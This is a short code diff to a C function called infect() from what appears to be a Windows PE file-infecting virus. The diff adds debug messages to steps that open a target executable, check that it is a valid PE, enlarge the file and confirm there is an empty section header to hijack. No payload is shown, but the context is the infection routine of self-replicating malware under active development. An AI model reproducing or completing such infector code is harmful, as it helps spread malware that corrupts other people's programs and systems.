@@ -6,10 +6,12 @@ int infect(const char* filename, data_t* data) {
   memzero(&fileView, sizeof(file_view_t));
 
   if (open_file_view(filename, &fileView, data) != 0){
+    PRINT_DEBUG("Could not open view of file\n");
     return 1;
   }
 
   if (!is_pe(fileView.startAddress)) {
+    PRINT_DEBUG("File not valid for infection (no PE/matching bitness)\n");
     close_file_view(&fileView, data);
     return 2;
   }
@@ -21,6 +23,7 @@ int infect(const char* filename, data_t* data) {
   fileView.size = extendedSize;
 
   if (open_file_view(filename, &fileView, data) != 0){
+    PRINT_DEBUG("Could not reopen view of file after increasing it's size\n");
     return 1;
   }
   
@@ -30,6 +33,7 @@ int infect(const char* filename, data_t* data) {
   sectionHeader += ntHeaders->FileHeader.NumberOfSections;
 
   if (!is_section_header_empty(sectionHeader)) {
+    PRINT_DEBUG("Section header not empty, can't infect\n");
     close_file_view(&fileView, data);
     return 3;
   }
